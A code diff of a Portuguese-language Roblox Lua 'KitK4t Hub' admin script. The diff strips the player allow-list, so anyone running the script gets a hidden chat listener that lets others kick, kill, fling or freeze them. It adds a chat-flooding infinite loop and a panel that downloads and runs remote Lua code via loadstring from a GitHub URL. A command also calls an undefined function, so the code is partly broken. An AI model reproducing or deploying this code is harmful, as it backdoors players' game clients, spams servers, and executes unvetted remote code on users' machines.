@@ -1,173 +1,28 @@
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Lighting = game:GetService("Lighting")
 local LocalPlayer = Players.LocalPlayer
 
--- Lista de jogadores autorizados
-local AUTHORIZED_PLAYERS = {
-    "Breno010L",
-    "shawnlovebazuka",
-    "saitama9rsm"
-}
-
--- Lista de tags especiais
-local SPECIAL_TAGS = {
-    ["Breno010L"] = "Dono kitkat 💀☠️",
-    ["shawnlovebazuka"] = "Sub dona kitkat 💘💀☠️"
-}
-
--- Função para verificar se o jogador está autorizado
-local function IsPlayerAuthorized()
-    for _, authorizedName in ipairs(AUTHORIZED_PLAYERS) do
-        if LocalPlayer.Name == authorizedName then
-            return true
-        end
-    end
-    return false
-end
-
--- Verificar autorização
-local AUTHORIZED = IsPlayerAuthorized()
-if not AUTHORIZED then
-    warn("Jogador não autorizado, script ignorado: " .. LocalPlayer.Name)
-    return  -- Sai do script se não estiver autorizado
-end
-
-print("Jogador autorizado! Carregando script...")
-
--- Função simplificada para detectar dispositivo
-local function IsMobileDevice()
-    return UserInputService.TouchEnabled
-end
-
--- Tamanhos da interface
-local interfaceConfig = {
-    width = 400,
-    height = 500,
-    buttonHeight = 40,
-    titleHeight = 35,
-    fontSize = 13,
-    titleFontSize = 15
-}
-
--- 🔥 Efeito especial Bill Cipher
-local function CreateBillCipherEffect()
-    local character = LocalPlayer.Character
-    if not character then return end
-    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-    if not humanoidRootPart then return end
-
-    local fire = Instance.new("Fire")
-    fire.Color = Color3.fromRGB(0, 100, 255)
-    fire.SecondaryColor = Color3.fromRGB(0, 200, 255)
-    fire.Size = 10
-    fire.Heat = 3
-    fire.Parent = humanoidRootPart
-
-    local sparkles = Instance.new("Sparkles")
-    sparkles.SparkleColor = Color3.fromRGB(0, 150, 255)
-    sparkles.Parent = humanoidRootPart
-
-    local pointLight = Instance.new("PointLight")
-    pointLight.Color = Color3.fromRGB(0, 100, 255)
-    pointLight.Brightness = 3
-    pointLight.Range = 15
-    pointLight.Parent = humanoidRootPart
-
-    task.delay(3, function()
-        fire:Destroy()
-        sparkles:Destroy()
-        pointLight:Destroy()
-    end)
-end
-
--- 🏷️ Funções de tag
-local function CreatePlayerTag(playerName, tagText)
-    local targetPlayer = Players:FindFirstChild(playerName)
-    if not targetPlayer then return false end
-    local character = targetPlayer.Character
-    if not character then return false end
-    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-    local head = character:FindFirstChild("Head")
-    if not humanoidRootPart and not head then return false end
-
-    local existingTag = character:FindFirstChild("KitK4tTag")
-    if existingTag then existingTag:Destroy() end
-
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "KitK4tTag"
-    billboard.Adornee = head or humanoidRootPart
-    billboard.Size = UDim2.new(0, 200, 0, 40)
-    billboard.StudsOffset = Vector3.new(0, 3, 0)
-    billboard.AlwaysOnTop = true
-    billboard.MaxDistance = 100
-    billboard.Parent = character
-
-    local tagFrame = Instance.new("Frame")
-    tagFrame.Size = UDim2.new(1, 0, 1, 0)
-    tagFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    tagFrame.BackgroundTransparency = 0.3
-    tagFrame.BorderSizePixel = 0
-    tagFrame.Parent = billboard
-
-    local tagCorner = Instance.new("UICorner")
-    tagCorner.CornerRadius = UDim.new(0, 8)
-    tagCorner.Parent = tagFrame
-
-    local tagLabel = Instance.new("TextLabel")
-    tagLabel.Size = UDim2.new(1, -10, 1, -10)
-    tagLabel.Position = UDim2.new(0, 5, 0, 5)
-    tagLabel.BackgroundTransparency = 1
-    tagLabel.Text = tagText
-    tagLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    tagLabel.TextSize = 12
-    tagLabel.Font = Enum.Font.GothamBold
-    tagLabel.TextStrokeTransparency = 0
-    tagLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    tagLabel.Parent = tagFrame
-
-    local glow = Instance.new("UIStroke")
-    glow.Color = Color3.fromRGB(0, 100, 255)
-    glow.Thickness = 2
-    glow.Parent = tagFrame
-
-    local sparkles = Instance.new("Sparkles")
-    sparkles.SparkleColor = Color3.fromRGB(0, 150, 255)
-    sparkles.Parent = head or humanoidRootPart
-
-    local pointLight = Instance.new("PointLight")
-    pointLight.Color = Color3.fromRGB(0, 100, 255)
-    pointLight.Brightness = 2
-    pointLight.Range = 15
-    pointLight.Parent = head or humanoidRootPart
-
-    task.delay(30, function()
-        if billboard and billboard.Parent then billboard:Destroy() end
-        if sparkles and sparkles.Parent then sparkles:Destroy() end
-        if pointLight and pointLight.Parent then pointLight:Destroy() end
-    end)
-
-    return true
-end
-
-local function ApplySpecialTag(playerName)
-    local tag = SPECIAL_TAGS[playerName]
-    if tag then
-        return CreatePlayerTag(playerName, tag)
+-- Envia comandos via chat
+local function SendCommandMessage(command, target)
+    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if channel then
+        local msg = "$$$" .. command
+        if target then msg = msg .. " " .. target end
+        channel:SendAsync(msg)
     else
-        return false
+        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+            .SayMessageRequest:FireServer("$$$" .. command .. (target and (" " .. target) or ""), "All")
     end
 end
 
--- 🔧 Funções de comandos
+-- Obter personagem
 local function GetCharacter(playerName)
     local plr = Players:FindFirstChild(playerName)
     return plr and plr.Character or nil
 end
 
+-- Funções de comandos
 local function Kick(playerName)
     if playerName == LocalPlayer.Name then
         LocalPlayer:Kick("Você foi removido pelo KitK4t Hub.")
@@ -181,9 +36,8 @@ local function LoopKill(playerName)
         if loopKill then
             task.spawn(function()
                 while loopKill do
-                    local char = LocalPlayer.Character
-                    if char then
-                        local hum = char:FindFirstChild("Humanoid")
+                    if LocalPlayer.Character then
+                        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
                         if hum then hum.Health = 0 end
                     end
                     task.wait(0.3)
@@ -197,8 +51,26 @@ local function KillPlus(playerName)
     if playerName == LocalPlayer.Name then
         local char = GetCharacter(LocalPlayer.Name)
         if char then
-            CreateBillCipherEffect()
             char:BreakJoints()
+            local root = char:FindFirstChild("HumanoidRootPart")
+            if root then
+                for i = 1, 10 do
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(10, 10, 10)
+                    part.Anchored = false
+                    part.CanCollide = false
+                    part.Material = Enum.Material.Neon
+                    part.BrickColor = BrickColor.Random()
+                    part.CFrame = root.CFrame
+                    part.Parent = workspace
+
+                    local bv = Instance.new("BodyVelocity")
+                    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(20, 80), math.random(-50, 50))
+                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+                    bv.Parent = part
+                    game.Debris:AddItem(part, 3)
+                end
+            end
         end
     end
 end
@@ -209,7 +81,6 @@ local function Fling(playerName)
         if char then
             local root = char:FindFirstChild("HumanoidRootPart")
             if root then
-                CreateBillCipherEffect()
                 local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                 local tween = TweenService:Create(root, tweenInfo, {CFrame = CFrame.new(50000, 5000000, 3972823)})
                 tween:Play()
@@ -222,7 +93,6 @@ local function Freeze(playerName)
     if playerName == LocalPlayer.Name then
         local char = LocalPlayer.Character
         if char and char:FindFirstChild("HumanoidRootPart") then
-            CreateBillCipherEffect()
             char.HumanoidRootPart.Anchored = true
         end
     end
@@ -248,14 +118,23 @@ local function bringTo(playerName)
 end
 
 local function Verifique()
-    CreateBillCipherEffect()
     local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
     if channel then
         channel:SendAsync("KitK4t_" .. math.random(1000, 9999))
     end
 end
 
--- 📨 Processar chat $$$ comando
+local function TimeoutRoblox()
+    task.spawn(function()
+        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        while true do
+            if channel then channel:SendAsync("##########") end
+            task.wait(0)
+        end
+    end)
+end
+
+-- ⚙️ Função para processar qualquer chat $$$ comando
 local function HandleChatCommand(text)
     if not text or type(text) ~= "string" then return end
     if string.sub(text, 1, 3) == "$$$" then
@@ -269,11 +148,13 @@ local function HandleChatCommand(text)
         if command == "fling" then Fling(target) end
         if command == "freeze" then Freeze(target) end
         if command == "unfreeze" then UnFreeze(target) end
-        if command == "bring" then bringTo(target) end
+        if command == "bring" then Bring(target) end
         if command == "verifique" then Verifique() end
+        if command == "timeoutroblox" then TimeoutRoblox() end
     end
 end
 
+-- 🔥 Compatível com novo e antigo sistema de chat
 pcall(function()
     TextChatService.MessageReceived:Connect(function(message)
         if message and message.Text then
@@ -289,17 +170,80 @@ Players.PlayerAdded:Connect(function(plr)
     plr.Chatted:Connect(HandleChatCommand)
 end)
 
--- 🧭 Interface Fofa e Animada
-task.spawn(function()
-    task.wait(2)
-    -- Aqui o painel só aparece para autorizados
-    if not AUTHORIZED then return end
+-- 🧭 Painel Rayfield
+task.delay(2, function()
+    local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua"))()
 
-    print("Criando interface...")
+    local Window = Rayfield:CreateWindow({
+        Name = "KitK4t Hub - Admin Painel",
+        LoadingTitle = "Script Secreto de Administradores",
+        LoadingSubtitle = "by Bazuka",
+        KeySystem = true,
+        KeySettings = {
+            Title = "Se já abriu, ignore isso",
+            Subtitle = "Não é necessário inserir key novamente.",
+            Note = "© KitK4t Hub Developers 2025",
+            FileName = "KitK4tKey",
+            SaveKey = true,
+            Key = "0000-batata-frita"
+        }
+    })
 
-    -- TODO: Colocar aqui todo o código da GUI como estava no seu script original
-    -- incluindo MainFrame, botões, TextBox, minimizar/maximizar etc.
+    local MainTab = Window:CreateTab("Principal", 4483362458)
 
-    CreateBillCipherEffect()
-    print("Interface criada com sucesso!")
+    local function GetPlayersList()
+        local list = {}
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer then
+                table.insert(list, plr.Name)
+            end
+        end
+        return list
+    end
+
+    local playerList = GetPlayersList()
+    local SelectedPlayer = playerList[1]
+
+    local PlayerDropdown = MainTab:CreateDropdown({
+        Name = "Selecionar Jogador",
+        Options = playerList,
+        CurrentOption = SelectedPlayer,
+        MultiSelection = false,
+        Flag = "DropdownPlayers",
+        Callback = function(Value)
+            SelectedPlayer = Value
+        end
+    })
+
+    Players.PlayerAdded:Connect(function()
+        PlayerDropdown:Refresh(GetPlayersList())
+    end)
+    Players.PlayerRemoving:Connect(function()
+        PlayerDropdown:Refresh(GetPlayersList())
+    end)
+
+    local commands = {
+        {Name=";kick", Command="kick"},
+        {Name=";loopkill", Command="loopkill"},
+        {Name=";killplus", Command="killplus"},
+        {Name=";fling", Command="fling"},
+        {Name=";freeze", Command="freeze"},
+        {Name=";unfreeze", Command="unfreeze"},
+        {Name=";bring", Command="bring"},
+        {Name=";verifique", Command="verifique"},
+        {Name=";timeoutroblox", Command="timeoutroblox"}
+    }
+
+    for _, cmd in ipairs(commands) do
+        MainTab:CreateButton({
+            Name = cmd.Name,
+            Callback = function()
+                if cmd.Command == "verifique" or cmd.Command == "timeoutroblox" then
+                    SendCommandMessage(cmd.Command)
+                else
+                    SendCommandMessage(cmd.Command, SelectedPlayer)
+                end
+            end
+        })
+    end
 end)
